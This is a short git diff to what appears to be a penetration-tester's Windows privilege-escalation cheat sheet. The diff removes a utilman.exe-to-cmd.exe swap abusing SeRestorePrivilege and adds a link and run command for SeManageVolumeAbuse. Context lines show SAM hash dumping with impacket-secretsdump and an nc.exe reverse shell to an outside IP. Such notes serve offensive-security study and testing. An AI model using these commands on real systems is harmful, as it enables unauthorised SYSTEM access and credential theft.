@@ -381,15 +381,6 @@ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 ```
 ##### SeRestorePrivilege To System
 ```
-GUI Version:
-
-.\EnableSeRestorePrivilege.ps1 (Enable SeRestore)
-mv C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
-mv C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
-Kali: rdesktop victom_ip
-Kali: win+U to skip credential input
-```
-```
 Terminal Version:
 
 .\EnableSeRestorePrivilege.ps1 (Enable SeRestore)
@@ -423,6 +414,10 @@ To set it up we need to:
 C:\xampp\htdocs\uploads\enox>WerTrigger.exe
 WerTrigger.exe
 c:/xampp/htdocs/uploads/nc.exe 192.168.118.23 4444 -e cmd.exe
+```
+```
+https://github.com/xct/SeManageVolumeAbuse?tab=readme-ov-file
+./SeManageVolumeAbuse.exe
 ```
 ##### PowerUp.ps1
 ```
